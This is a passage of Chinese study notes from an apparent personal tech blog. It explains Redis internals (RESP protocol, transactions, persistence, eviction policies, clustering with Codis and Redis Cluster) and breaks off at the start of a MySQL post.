<p>3)(Integer) 14      # 漏斗剩余空间是14</p>
<p>4)(Integer) -1       # 如果被拒绝了，多长时间后重试</p>
<p>5)(Integer) 2         # 多长时间后漏斗完全空出来</p>
<h1 id="数据传输与网络"><a href="#数据传输与网络" class="headerlink" title="数据传输与网络"></a>数据传输与网络</h1><h2 id="Redis的特点"><a href="#Redis的特点" class="headerlink" title="Redis的特点"></a>Redis的特点</h2><ul>
<li>是单线程程序。除Redis外，Node.js和Nginx也都是单线程。</li>
<li>数据存储在内存中</li>
<li>I&#x2F;O多路复用，是Redis能够处理大量客户端连接的原因</li>
<li>速度快</li>
</ul>
<p>Redis 速度快的原因主要包括以下几点：</p>
<ol>
<li>内存存储：Redis 将数据存放在内存中，而不是硬盘上。因为内存访问速度比硬盘快得多，所以 Redis 能够达到非常快的读写速度，这也是 Redis 被称为高性能数据库的重要原因之一。</li>
<li>单线程模型：Redis 使用单线程模型，即使用一个线程来处理所有的客户端请求，这使得 Redis 可以避免锁竞争、多线程切换等问题，从而提高了效率。</li>
<li>高效的网络 IO 模型：Redis 使用 I&#x2F;O 多路复用技术来实现高效的网络 IO 模型，这种模型可以同时管理多个客户端连接，并且每个连接都只被唤醒一次，从而减少了系统调用次数，提高了效率。</li>
<li>高效的数据结构：Redis 支持多种数据结构，如字符串、哈希表、列表、集合、有序集合等，这些数据结构经过优化和精简，能够快速地进行插入、删除、查询等操作，从而提高了性能。比如rehash就是优化的一个例子。</li>
<li>高效的持久化和异步处理机制：Redis 提供了 RDB 和 AOF 两种持久化方案，通过定期或追加记录将内存中的数据同步到硬盘。同时 Redis 还具有异步处理机制，可以延迟一部分 I&#x2F;O 操作，让 CPU 可以在更多的时间内执行其他操作，从而提高了系统的整体效率。</li>
</ol>
<h2 id="I-x2F-O线程模型"><a href="#I-x2F-O线程模型" class="headerlink" title="I&#x2F;O线程模型"></a>I&#x2F;O线程模型</h2><h3 id="同步与异步"><a href="#同步与异步" class="headerlink" title="同步与异步"></a>同步与异步</h3><p>同步指的是在发出一个功能调用时，在没有得到结果之前，该调用就不返回。也就是必须一件一件事做，等前一件做完了才能做下一件事。</p>
<p>异步的概念和同步相对，当一个异步过程调用发出后，调用者不需要立刻得到结果。调用被执行完成后，会通知调用者。</p>
<h3 id="5种主要的IO模型"><a href="#5种主要的IO模型" class="headerlink" title="5种主要的IO模型"></a>5种主要的IO模型</h3><ol>
<li><p>阻塞IO模型</p>
<p>当我们调用套接字的读写放方法，默认是阻塞的，read操作是在没有读取到字节时线程阻塞，write操作是在写缓冲区已满时阻塞。</p>
<p>典型应用：BIO（Blocking I&#x2F;O）</p>
</li>
<li><p>非阻塞IO模型</p>
<p>非阻塞IO在套接字对象上设置了non_blocking，读写方法不会阻塞，会反复地发起读&#x2F;写请求，对于read操作，当内核准备好数据之后就进行读，对于写操作，当写缓冲区的有空闲空间就进行写。</p>
<p>典型应用：Java NIO（Non-blocking I&#x2F;O，New I&#x2F;O）</p>
</li>
<li><p>多路复用IO模型</p>
<p>一种简单的多路复用API是select，多个的进程的IO注册到一个复用器（select）上，然后用一个进程调用该select，select会监听所有注册进来的IO。</p>
<p>如果select没有监听的IO在内核缓冲区都没有可读数据，select调用进程会被阻塞；而当任一IO在内核缓冲区中有可数据时，select调用就会返回；</p>
<p>典型应用：epoll（linux系统的性能最好的多路复用API）。</p>
</li>
<li><p>异步IO模型</p>
<p>当进程发起一个IO操作，进程返回（不阻塞），但也不能返回果结；内核把整个IO处理完后，会通知进程结果。如果IO操作成功则进程直接获取到数据。</p>
<p>典型应用：Java AIO（Asynchronous I&#x2F;O）</p>
</li>
<li><p>信号驱动IO模型</p>
<p>当进程发起一个IO操作，会向内核注册一个信号处理函数，然后进程返回不阻塞；当内核数据就绪时会发送一个信号给进程，进程便在信号处理函数中调用IO读取数据。</p>
</li>
</ol>
<h2 id="Redis序列化协议（RESP）"><a href="#Redis序列化协议（RESP）" class="headerlink" title="Redis序列化协议（RESP）"></a>Redis序列化协议（RESP）</h2><p>RESP是Redis序列化协议（Redis Serialization Protocal）的简写，是一种直观的文本协议。</p>
<p>RESP将传输的数据分为5种最小单元类型，单元结束时统一加上回车换行符号\r\n。<a target="_blank" rel="noopener" href="https://redis.io/docs/reference/protocol-spec/">规则如下</a>：</p>
<p>In RESP, the first byte determines the data type:</p>
<ul>
<li>For <strong>Simple Strings</strong>, the first byte of the reply is “+”</li>
<li>For <strong>Errors</strong>, the first byte of the reply is “-“</li>
<li>For <strong>Integers</strong>, the first byte of the reply is “:”</li>
<li>For <strong>Bulk Strings</strong>, the first byte of the reply is “$”. A “$” byte followed by the number of bytes composing the string (a prefixed length), terminated by CRLF.</li>
<li>For <strong>Arrays</strong>, the first byte of the reply is “<code>*</code>“</li>
</ul>
<p>NULL用多行字符串表示，不过长度要写成-1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$-1\r\n<br></code></pre></td></tr></table></figure>

<p>客户端向服务端发送的指令只有一种格式，多行字符串数组。比如指令<code>set author codehole</code>会被序列化为下面的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">*3\r\n$3\r\nset\r\n$6\r\nauthor\r\n$8\r\ncodehole\r\n<br></code></pre></td></tr></table></figure>

<p>服务端向客户端返回的数据结构有的比较复杂，不过也是以上五种基本类型的组合。例如scan命令的返回给客户端的结果，scan命令返回的是一个嵌套数组，数组的第一个值表示游标的值，如果这个值为零，说明已经遍历完毕。scan返回结果示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">*2\r\n$1\r\n0\r\n*3\r\n$4\r\ninfo\r\n$5\r\nbooks\r\n$6author\r\n<br></code></pre></td></tr></table></figure>

<p>里面嵌套了一个数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">*3\r\n$4\r\ninfo\r\n$5\r\nbooks\r\n$6author\r\n<br></code></pre></td></tr></table></figure>

<p>虽然RESP协议里面有大量冗余的回车换行符，但是依然是非常受欢迎的一个文本协议。</p>
<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>Redis的管道（Pipeline）不是由Redis服务器提供的技术，而是由客户端提供的。</p>
<p>Redis管道通过将多个命令打包在一起，然后一次性发送给Redis服务器，在一次通信中获得多个命令的执行结果。这样就可以减少通信次数，提高性能。</p>
<p>使用Redis自带的压力测试工具redis-benchmark,，可以测试出设置不同的单个管道内并行的请求数量所带来的QPS（Queries Per Second，每秒查询率）的改变。</p>
<h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>Redis事务的操作指令有multi、exec、discard、watch。分别表示事务的开始、提交、丢弃、监视变量。</p>
<p>所有指令在exec之前不会执行，而是缓存在服务器的事务队列中。执行完毕后一次性返回所有指令的运行结果。</p>
<p>Redis的事务不具备原子性，仅仅实现了事务的“串行化”，当前执行的事务不被其它的事务打断。</p>
<p>Redis的事务通常会结合pipeline一起使用，可以将多次IO操作合并为一次。在Python的Redis客户端，Redis执行事务时要强制使用pipeline。</p>
<p><strong>watch</strong></p>
<p>在 Redis 中，watch命令用来监视某个键，在服务器收到exec命令将要执行缓存的事务队列时，Redis会检查自变量被watch之后是否被改过。如果该键watch之后和exec之前被修改过，exec就会返回 NULL告诉客户端事务执行失败，这个时候客户端一般会选择重试。</p>
<p>需要注意的是，Redis禁止在multi和exec之间执行watch命令，必须在multi之前watch变量。</p>
<p>示例（Java语言中使用watch命令）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WatchUsage</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">keyFor</span><span class="hljs-params">(String userId)</span> &#123;<br>        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;account_%s&quot;</span>, userId);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">doubleAccount</span><span class="hljs-params">(Jedis jedis, String userId)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> keyFor(userId);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            jedis.watch(key);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> Integer.parseInt(jedis.get(key));<br>            value &lt;&lt;= <span class="hljs-number">1</span>; <span class="hljs-comment">//乘以2</span><br>            <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> jedis.multi();<br>            transaction.set(key, String.valueOf(value));<br>            List&lt;Object&gt; result = transaction.exec();<br>            <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> Integer.parseInt(jedis.get(key));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Jedis</span> <span class="hljs-variable">jedis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jedis</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1001&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> keyFor(userId);<br>        jedis.setnx(key, String.valueOf(<span class="hljs-number">5</span>));<br>        System.out.println(doubleAccount(jedis, userId));<br>        jedis.close();<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        输出结果：</span><br><span class="hljs-comment">        	10</span><br><span class="hljs-comment">        */</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="消息多播（PubSub）"><a href="#消息多播（PubSub）" class="headerlink" title="消息多播（PubSub）"></a>消息多播（PubSub）</h2><p>消息多播允许生产者只生产一次消息，由中间件负责将消息复制到多个消息队列，每个消费队列由对应的消费组进行消费。这是分布式系统常用的一种解耦方式，用于将多个消费组的逻辑进行拆分。</p>
<p>Redis中支持消息多播的模块是PubSub（PublisherSubscriber，发布者-订阅者模式）</p>
<p>Redis提供的模式订阅命令是<code>subscribe</code>，Redis还提供了<code>psubscribe</code>命令（pattern subscribe），可以实现通过模式匹配订阅主题。</p>
<p>命令：</p>
<ol>
<li>subscribe：订阅主题</li>
<li>psubscribe：通过模式匹配订阅主题</li>
<li>unsubscribe：取消订阅主题</li>
<li>unpsubscribe：通过模式匹配取消订阅主题</li>
</ol>
<p>PubSub的缺点：</p>
<ol>
<li>当生产者发送消息时，如果消费者下线没有收到消息，那么该消息对于该消费者来说就是彻底丢失了</li>
</ol>
<p>正式因为PubSub有这个缺点，在消息队列的领域几乎找不到合适的应用场景。Redis5.0新增了Stream数据结构，给Redis带来了持久化的消息队列，从此PubSub退出作为消息队列的技术方案选项。</p>
<h1 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h1><h3 id="RDB日志（内存快照）"><a href="#RDB日志（内存快照）" class="headerlink" title="RDB日志（内存快照）"></a>RDB日志（内存快照）</h3><p>RDB（Redis DataBase）日志（内存快照）是内存数据的二进制序列化，是全量备份。</p>
<p>内存快照要求Redis必须进行文件IO操作，而Redis是单线程程序，如果一边处理业务请求，一边进行文件IO操作，会降低处理业务请求的性能，还有个问题是，这种操作下，内存数据一边被持久化一边被修改，快照就不是对一个时间点的记录，而是成了多个时间点交错的记录，无法使用。</p>
<p>Redis使用操作系统多进程COW（Copy On Write）机制来实现快照持久化。</p>
<p>Copy-On-Write（COW）是一种操作系统中常用的技术，其基本思想是：当多个进程需要访问同一块内存地址时，操作系统会将这块内存标识为只读，并且在任何进程试图写入该内存前，都会复制一份副本供该进程使用。这样就能够保证每个进程都拥有自己的独立内存空间，而不会互相干扰。</p>
<h3 id="AOF日志"><a href="#AOF日志" class="headerlink" title="AOF日志"></a>AOF日志</h3><p>AOF（Append Only File）日志是内存数据修改的指令记录文本，是增量备份。</p>
<p>Redis收到客户端的修改命令后，进行参数校验、逻辑处理，如果没问题，就将该指令文本存储到AOF日志中，即先执行指令再将存储日志。</p>
<p>AOF日志在长期的运行过程中会变得十分庞大，数据库重启时需要加载AOF日志进行指令重放，这个过程就会很漫长，所以需要定期进行AOF重写，给AOF日志进行瘦身。</p>
<p>Redis提供了bgrewriteaof命令用于对AOF日志进行瘦身，其原理是开辟一个子进程对内存进行遍历，转换成一系列Redis的操作命令，序列化到一个新的AOF日志文件中，序列化完成后再将操作期间发生的增量AOF日志追加到这个新的AOF日志文件中，追加完毕后就可以替代旧的AOF日志文件了。</p>
<p>当程序对AOF日志文件进行写操作时，实际上是将内容写到了以内核为文件描述符分配的一个内存缓存中，然后内核会异步地将脏数据刷回到磁盘。这就意味着，如果突然宕机，AOF日志还没有完全刷新到磁盘中，就会出现日志丢失。Linux的glibc提供的fsync(int fd)函数可以将指定文件的内容强制从内核缓存刷新到磁盘，只要Redis进行实时调用fsync函数就可以保证AOF日志不丢失。但是fsync是一个磁盘IO操作，很慢，如果Redis执行一条指令就要fsync一次，那么会严重降低Redis的性能。所以在生产环境的服务器中，Redis通常是每隔1s左右执行一次fsync操作，这个1s的周期是可以配置的，是在安全性和性能间做的折中。</p>
<p>因为RDB和AOF都会加重系统的负担，所以通常Redis的主节点不会进行持久化操作，持久化操作主要在从节点进行，这是因为从节点没有来自客户端请求的压力，系统资源充足。</p>
<h3 id="混合持久化"><a href="#混合持久化" class="headerlink" title="混合持久化"></a>混合持久化</h3><p>使用RDB恢复内存状态会丢失备份后修改的数据，而使用AOF日志的全量文件重放又相对RDB慢很多，Redis为解决这个问题，从Redis4.0开始，引入了一个新的持久化选项，混合持久化。</p>
<p>混合持久化的持久化方式是指生成RDB全量日志和该RDB的AOF增量日志，在Redis重启的时候，先加载RDB日志，再加载AOF日志。</p>
<h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><h2 id="内存回收机制"><a href="#内存回收机制" class="headerlink" title="内存回收机制"></a>内存回收机制</h2><p>被删除的key分散在很多页面中，这个页面可能还有其它正在使用的key，操作系统是以页为单位进行内存回收的，这个页上只要还有一个key在使用，那这个页就不能回收。</p>
<p>Redis虽然无法保证立即回收已经删除key的内存，但是它会重新使用哪些尚未回收的空闲内存。</p>
<h2 id="内存分配机制"><a href="#内存分配机制" class="headerlink" title="内存分配机制"></a>内存分配机制</h2><p>Redis在内存分配方面，直接使用了第三方的内存分配库，目前Redis使用jemalloc（facebook）库来管理内存，也可以切换到tcmalloc（google），因为jemalloc比tcmalloc性能稍好，所以Redis默认使用jemalloc。</p>
<p>通过<code>info memory</code>可以查看Redis使用的是哪个第三方的内存分配库。</p>
<h2 id="数据过期机制"><a href="#数据过期机制" class="headerlink" title="数据过期机制"></a>数据过期机制</h2><h3 id="定时删除"><a href="#定时删除" class="headerlink" title="定时删除"></a>定时删除</h3><p>EXPIRE命令可以为指定的键设置过期时间，时间到达后，这些建会被自动删除。</p>
<p>serverCron函数会定时触expire.c下的activeExpireCycle函数，该函数会清除数据库中的过期数据，该函数可以设置最长执行时间和每次删除操作删除的最大的key数量。以避免删除操作延时过长。</p>
<h3 id="惰性删除"><a href="#惰性删除" class="headerlink" title="惰性删除"></a>惰性删除</h3><p>惰性删除是当用户查询键时，检测键是否过期，如果键已经过期，则删除该键。该操作由expireIfNeeded函数完成。</p>
<h2 id="数据淘汰策略"><a href="#数据淘汰策略" class="headerlink" title="数据淘汰策略"></a>数据淘汰策略</h2><h3 id="Redis支持的数据淘汰策略"><a href="#Redis支持的数据淘汰策略" class="headerlink" title="Redis支持的数据淘汰策略"></a>Redis支持的数据淘汰策略</h3><p><a target="_blank" rel="noopener" href="https://redis.io/docs/reference/eviction/">Redis官方给出的数据淘汰策略（Eviction policies）文档</a>。下面是从官网复制的Redis支持的数据淘汰策略及其解释。</p>
<p>The exact behavior Redis follows when the <code>maxmemory</code> limit is reached is configured using the <code>maxmemory-policy</code> configuration directive.</p>
<p>The following policies are available:</p>
<ul>
<li><strong>noeviction</strong>: New values aren’t saved when memory limit is reached. When a database uses replication, this applies to the primary database</li>
<li><strong>allkeys-lru</strong>: Keeps most recently used keys; removes least recently used (LRU) keys</li>
<li><strong>allkeys-lfu</strong>: Keeps frequently used keys; removes least frequently used (LFU) keys</li>
<li><strong>volatile-lru</strong>: Removes least recently used keys with the <code>expire</code> field set to <code>true</code>.</li>
<li><strong>volatile-lfu</strong>: Removes least frequently used keys with the <code>expire</code> field set to <code>true</code>.</li>
<li><strong>allkeys-random</strong>: Randomly removes keys to make space for the new data added.</li>
<li><strong>volatile-random</strong>: Randomly removes keys with <code>expire</code> field set to <code>true</code>.</li>
<li><strong>volatile-ttl</strong>: Removes keys with <code>expire</code> field set to <code>true</code> and the shortest remaining time-to-live (TTL) value.</li>
</ul>
<h3 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h3><p>LRU（Least Recently Used）：如果一个数据在最近一段时间内没有被访问，那么可以认为它未来被访问的概率很小。当空间满时，最久没有访问的数据会最先被淘汰。</p>
<p>LRU记录的是时间戳。</p>
<p>Redis的LRU算法是一种近似LRU算法，没有维护key的被访问时间顺序，而是采用随机采样出N个（比如5个，可以设置），然后淘汰掉最旧的key，为能够识别出key的访问时间，Redis给每个key增加了一个额外的字段，最后一次被访问的时间戳。</p>
<h3 id="LFU"><a href="#LFU" class="headerlink" title="LFU"></a>LFU</h3><p>LFU（Least Frequently Used）：如果一个数据在最近一段时间内很少被访问，那么认为将来它被访问的可能性很小。当空间满时，最小频率访问的数据最先被淘汰。</p>
<p>LFU记录的是使用次数。</p>
<p>Redis会根据键的空闲事件对LFU计数进行衰减。</p>
<h1 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h1><h2 id="主从同步"><a href="#主从同步" class="headerlink" title="主从同步"></a>主从同步</h2><p>Redis的主从数据是异步复制的，所以分布式Redis系统不满足CAP理论中的一致性（C，Consistency）。</p>
<p>即使在主从网络断开的情况下，主从节点依旧可以向外提供服务，所以Redis满足可用性（A，Availability）。</p>
<p>Redis支持主从同步和从从同步（用以减轻主节点同步的负担）</p>
<h3 id="快照（RDB）同步"><a href="#快照（RDB）同步" class="headerlink" title="快照（RDB）同步"></a>快照（RDB）同步</h3><p>快照同步是在主节点上进行一次bgsave，将当前内存的数据快照存储到磁盘，再将快照文件传输到从节点，从节点接收完毕后，执行全量加载，加载完毕后通知主节点进行增量同步。</p>
<p>进行快照同步时，文件IO操作十分耗时，且会影响fsync的执行，所以从Redis2.8.18开始支持无盘复制，主服务器通过套接字直接将快照内容发送给从节点，从节点将接收到的内容存储到硬盘文件。</p>
<h3 id="增量（AOF）同步"><a href="#增量（AOF）同步" class="headerlink" title="增量（AOF）同步"></a>增量（AOF）同步</h3><p>Redis增量同步同步的是指令流，主节点会将那些对自己的状态产生修改性影响的指令记录在本地的内存buffer中，然后异步地将buffer中的指令同步到从节点。</p>
<p>Redis的buffer是一个定长的环形数组，如果数组内容满了，就会从头开始覆盖前面的内容，如果因为网络状况不好等原因没有及时的同步，那么没有同步的指令可能会被后续的指令覆盖，此时就需要使用快照同步。如果进行快照同步的过程中，buffer又发生了覆盖，就会引发又一次的快照同步，所以如果buffer大小设置不当，可能引起快照同步的死循环。</p>
<h3 id="增加节点"><a href="#增加节点" class="headerlink" title="增加节点"></a>增加节点</h3><p>当节点添加到集群，会先进行一次快照同步，完成后再继续进行增量同步。</p>
<h3 id="同步复制"><a href="#同步复制" class="headerlink" title="同步复制"></a>同步复制</h3><p>Redis3.0之后增加了wait指令，可以将主从复制由异步改为同步，可以设置需要同步的从节点的数量和最长等待时间（-1表示无限等待）。</p>
<h2 id="Sentinel"><a href="#Sentinel" class="headerlink" title="Sentinel"></a>Sentinel</h2><p>Redis提供的Sentinel（哨兵）可以实现集群主节点发生故障后自动进行主从切换。具体作用如下：</p>
<ul>
<li><p>Sentinel能够持续监控主从节点的在线状况。</p>
</li>
<li><p>客户端连接集群时，会首先连接Sentinel，通过Sentinel查询主节点的地址，当主节点发生故障时，Sentinel会将最新的主节点地址告诉客户端。</p>
</li>
<li><p>Sentinel无法保证主从同步因为异步而在主节点下线后产生消息丢失，但是会采取措施限制主从延迟，方式是设置参数<code>min-slaves-to-write</code>和<code>min-slaves-max-tag</code>，第一个参数表示主节点至少有多少个从节点正在进行正常复制，如果不够，就停止写服务。正常复制是含义是由第二个参数控制的，它的单位是秒，表示如果在多少秒内没有收到从节点的反馈，就意味着从节点的同步不正常。</p>
</li>
<li><p>主从切换后，为使客户端“知道”地址变更了，Sentinel会关闭所有的客户端连接，在重连时使客户端使用新的地址。</p>
</li>
</ul>
<h2 id="Redis集群方案"><a href="#Redis集群方案" class="headerlink" title="Redis集群方案"></a>Redis集群方案</h2><h3 id="Codis"><a href="#Codis" class="headerlink" title="Codis"></a>Codis</h3><p>Codis是Redis的集群代理中间件，当客户端向Codis发送指令时，Codis负责将指令转发到后面的Redis实例执行，并将返回结构转回给客户端。Code上挂接的所有Redis实例构成一个Redis集群，当集群空间不足时，可以通过动态增加Redis实例来实现扩容。</p>
<p>因为单个Codis代理能支撑的QPS有限，可以启动多个Codis代理增加QPS，还可以起到容灾的功能。</p>
<p><strong>Codis的槽位定位算法：</strong></p>
<p>Codis将key转发到对应Redis实例的定位机制是通过划分槽位实现的。Codis默认将所有的key划分为1024个槽位（slot），对客户端传入的key进行crc32运算计算hash值，然后用这个hash值对1024取余，这个余数就是key所属的槽位。</p>
<p>每个槽位都会映射到多个Redis实例。Codis会维护槽位和Redis实例的对应关系。当使用到多个Codis实例，就需要对不同Codis实例的槽位信息进行同步，需要使用一个分布式配置存储库如zookeeper，Codis会监听到槽位信息的变化并同步槽位信息。</p>
<p><strong>Codis处理Redis扩容：</strong></p>
<p>当Redis扩容（增加Redis实例）时，会对槽位关系进行调整，并进行自动均衡。</p>
<p><strong>使用Codis的缺点：</strong></p>
<p>由于key分散在不同的Redis实例中，所以不再支持事务。</p>
<p>客户端需要多走一个网络节点（Codis节点）才能到达Redis，性能上比直接访问Redis性能有所下降。</p>
<p><strong>Codis的优点：</strong></p>
<p>Codis在设计上比Redis Cluster简单，将分布式配置问题交给了第三方（zookeeper或etcd）负责，省去了编写和维护分布式一致性的工作。而Redis Cluster自己实现了这一点，混合使用了Raft和Gossip协议，有大量需要调优的配置参数，集群出现故障时不容易排查。</p>
<h3 id="Codis和Redis-Cluster的不同"><a href="#Codis和Redis-Cluster的不同" class="headerlink" title="Codis和Redis Cluster的不同"></a>Codis和Redis Cluster的不同</h3><ol>
<li>Codis的默认槽位数是1024，而Redis Cluster的默认槽位数是16382</li>
<li>Codis是中心化的（需要使用如zookeeper维护配置信息），Redis Cluster是去中心化的（通过Raft和Gossip协议自行维护配置信息）</li>
<li>客户端访问Codis维护的Redis集群每次都需要经过Codis节点，而客户端访问Redis Cluster维护的Redis集群可以直接根据获取到的配置信息定位到Redis实例</li>
<li>Codis默认使用crc32算法计算key的hash值，Redis Cluster默认使用的是crc16</li>
</ol>
<h3 id="Redis-Cluster"><a href="#Redis-Cluster" class="headerlink" title="Redis Cluster"></a>Redis Cluster</h3><p>与Codis不同，Redis Cluster是去中心化的，该集群由三个Redis节点组成，每个节点负责整个集群的一部分数据，它们之间使用一种特殊的二进制协议交互集群信息。</p>
<p>Redis Cluster将所有key划分为16382个槽位，每个节点负责存储其中一部分槽位映射信息。客户端连接集群时会得到一份集群的槽位配置信息，客户端可以直接根据该信息定位到目标节点（Redis实例）。</p>
<p><strong>Redis Cluster的槽位定位算法：</strong></p>
<p>Redis Cluster默认对key使用crs16算法进行hash，得到一个整数值，然后对16382取余得到具体的槽位</p>
<p>Redis Cluster还允许用户强制把指定key挂在特定的槽位上，实现方法是在key字符串上添加tag标记。</p>
<p><strong>Redis Cluster的槽位纠错机制：</strong></p>
<p>当客户端向一个错误节点发出了指令，该节点会发现指令的key所在的槽位并不归自己管理，这时它会向客户端发送一个特殊的跳跃指令（MOVED指令）携带目标操作的节点地址，告诉客户端去连接这个节点以获取数据。</p>
<p><strong>Redis Cluster的数据迁移策略：</strong></p>
<p>Redis Cluster的数据迁移的单位是槽，提供的迁移工具是redis-trib，redis-trib首先会在源节点和目标节点设置好中间过渡状态，然后再一次性获取源节点槽位的所有key列表，再逐个key进行迁移。每个key迁移到过程是以源节点作为目标节点的客户端，源节点对当前key执行dump指令得到序列化内容，然后向目标节点发送restore指令携带序列化的内容作为参数，目标节点再反序列化就可以把内容恢复到目标节点的内存中。然后返回给源节点OK信息，源节点收到后把当前节点的key删除。</p>
<p>当源节点正在进行对key的数据迁移，源节点的主线程就会处于阻塞状态，直到key被成功删除。在迁移过程中如果每个key都很小，migrate迁移指令会执行的很快，而如果key比较大，就会导致阻塞源节点的正常服务。</p>
<p>因为migrate命令是同步阻塞的，因此不会存在一个key正在被迁移又同时被读写的情况，但由于一个slot下可能有部分key被迁移完成，部分key正在等待迁移的情况，因此如果读写的key所属的slot正在被迁移，redis-cluster做如下处理：</p>
<ol>
<li>客户端根据本地slots缓存发送命令到源节点，如果存在键对象则直接指向并返回结果给客户端。</li>
<li>如果key对象不存在，但key所在的slot属于本节点，则可能存在于目标节点，这时源节点会回复ASK重定向异常<code>-ASK targetNodeAddr</code></li>
<li>客户端从ASK重定向异常提取出目标节点的地址信息（targetNodeAddr），发送asking命令到目标节点。目标节点如果key存在则执行，不存在则返回不存在信息。</li>
</ol>
<p><strong>Redis Cluster处理网络抖动：</strong></p>
<p>网络抖动是突然间部分连接不可访问，然后很快又恢复正常的一种现象。</p>
<p>为解决网络抖动的问题，Redis Cluster提供了配置参数cluster-node-timeout，表示当前某个节点持续timeout的时间失联时，才认定该节点出现故障。如果没有这一配置选项，网络抖动会导致频繁的主从切换。</p>
<h4 id="Raft协议"><a href="#Raft协议" class="headerlink" title="Raft协议"></a>Raft协议</h4><h4 id="Gossip协议"><a href="#Gossip协议" class="headerlink" title="Gossip协议"></a>Gossip协议</h4><p>可能下线（PFail）和确定下线（Fail）：因为Redis Cluster是去中心化的，一个节点认为某个节点失联了并不代表所有节点都认为它失联了，所以集群需要进行一次协商，只有当大多数节点都认为某节点失联了，集群才做出节点已经下线的判断。</p>
<p>Redis Cluster采用Gossip协议来广播自己的状态以及改变对整个集群节点的在线状态。</p>
<h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><h2 id="info指令"><a href="#info指令" class="headerlink" title="info指令"></a>info指令</h2><ul>
<li>info stats：查看Redis 每秒执行多少次指令。</li>
<li>info clients：查看Redis 连接了多少客户端。</li>
<li>rejected_connections：查看因为超出大量连接限制而被拒接的客户端连接次数。如果这个数字很大意味着服务器的最大连接数设置的过低，需要调整 maxclients 参数。其默认值为 1w。</li>
<li>info memory：查看Redis 内存占用多大</li>
<li>info replication：查看复制积压缓冲区大小</li>
</ul>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-06T03:02:46.000Z" title="2023/5/6 11:02:46">2023-05-06</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-28T08:04:20.182Z" title="2023/5/28 16:04:20">2023-05-28</time></span><span class="level-item">3 hours read (About 24934 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/06/MySQL/">MySQL</a></p><div class="content"><h1 id="监视器"><a href="#监视器" class="headerlink" title="监视器"></a>监视器</h1><h2 id="打开MySQL监视器"><a href="#打开MySQL监视器" class="headerlink" title="打开MySQL监视器"></a>打开MySQL监视器</h2><p>打开MySQL监视器的命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u 用户名 -p密码<br></code></pre></td></tr></table></figure>

<p>或者使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u 用户名 -p<br></code></pre></td></tr></table></figure>

<p>然后输入密码即可</p>
<h2 id="查看字符编码"><a href="#查看字符编码" class="headerlink" title="查看字符编码"></a>查看字符编码</h2><p>在监视器中查看MySQL中字符编码等的设置情况的命令：</p>
